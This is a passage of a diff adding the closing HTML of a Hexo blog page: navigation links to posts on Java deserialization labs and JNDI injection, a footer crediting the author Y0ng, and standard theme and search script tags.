+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/java-serlab/" rel="prev" title="javaDeserializeLabs">
+                  <i class="fa fa-angle-left"></i> javaDeserializeLabs
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/JNDI-attack/" rel="next" title="JNDI注入之略微学学">
+                  JNDI注入之略微学学 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
